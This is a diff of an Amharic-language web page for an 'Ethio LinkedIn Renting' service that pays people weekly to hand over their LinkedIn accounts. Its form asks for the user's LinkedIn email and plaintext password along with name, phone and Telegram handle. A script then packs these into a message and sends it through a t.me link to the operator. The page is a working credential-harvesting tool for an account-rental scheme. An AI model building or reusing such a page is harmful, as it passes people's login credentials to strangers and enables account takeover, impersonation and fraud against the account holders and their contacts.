@@ -1,33 +1,155 @@
-
 <!DOCTYPE html>
 <html lang="am">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ethio LinkedIn</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            text-align: center;
-            padding: 50px;
-        }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-            display: inline-block;
-        }
-        h1 { color: #0077b5; }
-        img { max-width: 100%; height: auto; border-radius: 8px; margin-top: 15px; }
-    </style>
+    <title>Ethio LinkedIn Renting</title>
+    <!-- Tailwind CSS ለሚያምር ዲዛይን -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- Font Awesome ለኣይኮኖች -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
-<body>
-    <div class="container">
-        <h1>እንኳን ወደ Ethio LinkedIn በደህና መጡ!</h1>
-        <p>የእርስዎ ፕሮፌሽናል ድረ-ገጽ በቅርብ ቀን ይጠናቀቃል።</p>
-        <img src="IMG_20260619_121402_550.jpg" alt="Ethio LinkedIn Logo">
-    </div>
+<body class="bg-gray-50 text-gray-800 font-sans">
+
+    <!-- Header / ራስጌ -->
+    <header class="bg-[#0077b5] text-white py-6 shadow-md text-center">
+        <div class="max-w-4xl mx-auto px-4">
+            <img src="IMG_20260619_121402_550.jpg" alt="Ethio LinkedIn Logo" class="w-24 h-24 mx-auto rounded-full border-4 border-white object-cover mb-3 shadow-lg">
+            <h1 class="text-3xl font-bold tracking-wide">Ethio LinkedIn Renting</h1>
+            <p class="text-blue-100 mt-1">የእርስዎን የሊንክዲን አካውንት አከራይተው በየሳምንቱ ተከፋይ ይሁኑ!</p>
+        </div>
+    </header>
+
+    <main class="max-w-4xl mx-auto px-4 py-8">
+        
+        <!-- የመመሪያዎች ክፍል -->
+        <section class="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 mb-8">
+            <h2 class="text-xl font-bold text-[#0077b5] mb-4 flex items-center gap-2">
+                <i class="fas fa-info-circle"></i> መሟላት ያለባቸው መስፈርቶች እና መረጃዎች
+            </h2>
+            <div class="grid md:grid-cols-2 gap-4 text-sm">
+                <div class="space-y-3">
+                    <div class="flex items-start gap-2">
+                        <i class="fas fa-check-circle text-green-500 mt-1"></i>
+                        <p><strong>አካውንት መስፈርት:</strong> ቢያንስ 100 ኮኔክሽን (Connections) ሊኖረው ይገባል።</p>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i class="fas fa-calendar-alt text-blue-500 mt-1"></i>
+                        <p><strong>የክፍያ ጊዜ:</strong> ክፍያ በየሳምንቱ (በየ 7 ቀኑ) ይፈጸማል።</p>
+                    </div>
+                </div>
+                <div class="space-y-3">
+                    <div class="flex items-start gap-2">
+                        <i class="fas fa-shield-alt text-amber-500 mt-1"></i>
+                        <p><strong>ደህንነት:</strong> የይለፍ ቃልዎ (Password) ያለእርስዎ ፈቃድ በፍጹም አይቀየርም።</p>
+                    </div>
+                    <div class="flex items-start gap-2">
+                        <i class="fas fa-id-card text-purple-500 mt-1"></i>
+                        <p><strong>መታወቂያ:</strong> ብሔራዊ መታወቂያ ወይም ፓስፖርት እንዲኖርዎት ይመከራል።</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- የምዝገባ ፎርም -->
+        <section class="bg-white rounded-2xl p-6 shadow-md border border-gray-100">
+            <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">አካውንትዎን ያከራዩ</h2>
+            
+            <form id="rentalForm" class="space-y-5">
+                <div>
+                    <label class="block text-sm font-semibold text-gray-700 mb-1">ሙሉ ስም</label>
+                    <input type="text" id="fullName" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="የአባት ስም ጭምር">
+                </div>
+
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">የስልክ ቁጥር</label>
+                        <input type="tel" id="phone" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="09...">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">የቴሌግራም ተጠቃሚ ስም (Username)</label>
+                        <input type="text" id="telegram" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="@username">
+                    </div>
+                </div>
+
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">የሊንክዲን ኢሜይል / ስልክ</label>
+                        <input type="text" id="linkedinEmail" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="example@gmail.com">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">የሊንክዲን ይለፍ ቃል (Password)</label>
+                        <input type="password" id="linkedinPassword" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="••••••••">
+                    </div>
+                </div>
+
+                <div class="grid md:grid-cols-2 gap-4">
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">የኮኔክሽን ብዛት (Connections)</label>
+                        <input type="number" id="connections" min="100" required class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none" placeholder="ቢያንስ 100">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-semibold text-gray-700 mb-1">መታወቂያ አላቸው?</label>
+                        <select id="hasId" class="w-full px-4 py-2.5 rounded-lg border border-gray-300 focus:ring-2 focus:ring-[#0077b5] focus:outline-none">
+                            <option value="አለኝ (ብሔራዊ መታወቂያ / ፓስፖርት)">አለኝ (ብሔራዊ መታወቂያ / ፓስፖርት)</option>
+                            <option value="የለኝም">የለኝም</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button type="button" onclick="sendToTelegram()" class="w-full bg-[#0077b5] hover:bg-[#005f93] text-white font-bold py-3 px-4 rounded-lg transition duration-200 shadow-md flex items-center justify-center gap-2 mt-4 cursor-pointer">
+                    <i class="fab fa-telegram-plane text-xl"></i> መረጃውን በቴሌግራም ላክ
+                </button>
+            </form>
+        </section>
+
+        <!-- የእውቂያ እና የማኅበራዊ ገጽ ሊንኮች -->
+        <section class="mt-8 text-center space-y-4">
+            <div class="flex justify-center gap-4 flex-wrap">
+                <a href="https://t.me/Ethiolinkedin12" target="_blank" class="bg-blue-50 text-[#0077b5] border border-blue-200 px-4 py-2 rounded-full text-sm font-medium hover:bg-blue-100 transition flex items-center gap-2">
+                    <i class="fab fa-telegram shadow-sm"></i> የቴሌግራም ቻናል
+                </a>
+                <a href="tel:0922573921" class="bg-green-50 text-green-700 border border-green-200 px-4 py-2 rounded-full text-sm font-medium hover:bg-green-100 transition flex items-center gap-2">
+                    <i class="fas fa-phone-alt"></i> 0922573921
+                </a>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer ከባለቤትነት ስም ጋር -->
+    <footer class="bg-gray-800 text-gray-400 py-6 text-center text-xs mt-12 border-t border-gray-700">
+        <p>&copy; 2026 Ethio LinkedIn Renting. የተሰራው እና የበለፀገው በ Aron Shimelis Belete</p>
+    </footer>
+
+    <!-- ፎርሙን ሞልተው ሲጨርሱ መረጃውን ቀጥታ ወደ አንተ ቴሌግራም የሚመራ አጭር ስክሪፕት -->
+    <script>
+        function sendToTelegram() {
+            const name = document.getElementById('fullName').value;
+            const phone = document.getElementById('phone').value;
+            const telegram = document.getElementById('telegram').value;
+            const email = document.getElementById('linkedinEmail').value;
+            const pass = document.getElementById('linkedinPassword').value;
+            const connections = document.getElementById('connections').value;
+            const idStatus = document.getElementById('hasId').value;
+
+            if(!name || !phone || !telegram || !email || !pass || !connections) {
+                alert("እባክዎ ሁሉንም መረጃዎች በትክክል ይሙሉ!");
+                return;
+            }
+
+            const message = `✨ አዲስ አካውንት አከራይ ተመዝግቧል ✨\n\n` +
+                            `👤 ስም: ${name}\n` +
+                            `📞 ስልክ: ${phone}\n` +
+                            `✈️ ቴሌግራም: ${telegram}\n` +
+                            `📧 ሊንክዲን ኢሜይል: ${email}\n` +
+                            `🔑 የይለፍ ቃል: ${pass}\n` +
+                            `👥 ኮኔክሽን ብዛት: ${connections}\n` +
+                            `🪪 መታወቂያ ሁኔታ: ${idStatus}`;
+
+            // ወደ አንተ የግል ቴሌግራም የሚወስድ ሊንክ
+            const telegramUrl = `https://t.me/Ethiolinkedin1221?text=${encodeURIComponent(message)}`;
+            window.open(telegramUrl, '_blank');
+        }
+    </script>
 </body>
 </html>
